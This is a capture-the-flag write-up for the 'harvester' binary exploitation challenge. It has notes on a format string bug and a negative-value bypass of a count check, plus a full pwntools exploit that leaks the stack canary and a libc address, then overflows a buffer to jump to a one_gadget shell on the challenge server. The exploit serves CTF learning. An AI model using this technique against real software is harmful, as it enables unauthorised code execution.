---
title: harvester
date: 2021-04-23
categories: [pwn]
tags: [cyberapocalpyse2021]
toc: false
---

#### Notes:
- Binary comes with all mitigations and we are given libc
- There is a menu with options of: fight, stare, inventory, or run (exit)
- check_pies(num_pies) checks for num_pies <= 0x64 && num_pies != 0xf
- Format string bug in fight() -> printf(&user_input)
- inventory() shows how many pies we have, it also allows us to drop pies, this will be used to bypass check_pie(num_pies) later
- stare() allows us to gain 1 pie every time, when we have 0x16 pies, it lets us read 0x40 bytes to a buffer, this is where we will inject our payload

#### Plan:
- Leak canary and a libc address using FSB
- After calculating libc base, we can use a one_gadget to do a one pass exploit
- Bypass check_pie(num_pies) by dropping -11 pies in inventory(),
since the logic to drop pies is pie = pie - amt_to_drop, we can just do pie = pie - (-11) to get to 0x16 pies
- Send payload with canary and one_gadget 

#### harvest():

![Snippet of harvest()](/assets/img/cyberapoc/harvester/harvest.png)

#### inventory():

![Snippet of inventory()](/assets/img/cyberapoc/harvester/inventory.png)

#### fight():

![Snippet of fight()](/assets/img/cyberapoc/harvester/fight.png)

#### stare():

![Snippet of stare()](/assets/img/cyberapoc/harvester/stare.png)

#### PoC:

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template harvester
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('harvester')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *fight+198
b *stare+233
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()
io = remote('138.68.179.198', 32034)

canary_position = b'%11$p'

def fight(payload):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('> ')
    io.sendline(payload)

def stare():
    io.recvuntil('> ')
    io.sendline('3')

def inventory(drop_amt):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil('> ')
    io.sendline('y')
    io.recvuntil('> ')
    io.sendline(drop_amt)

fight(canary_position)

io.recvuntil('is: ')
canary = int(io.recvline()[0:18], 16)
print('Canary: ', hex(canary))

libc_addr_position = b'%21$p'
fight(libc_addr_position)

io.recvuntil('is: ')
leak = int(io.recvline()[0:14], 16)
print('Leak: ', hex(leak))

libc_base = leak - 0x021bf7
one_gadget = libc_base + 0x4f3d5
print('Libc base: ', hex(libc_base))

inventory('-11')
stare()

payload = flat({
    40: p64(canary),
    56: p64(one_gadget)
})

io.recvuntil('> ')
io.sendline(payload)

io.interactive()

# CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
```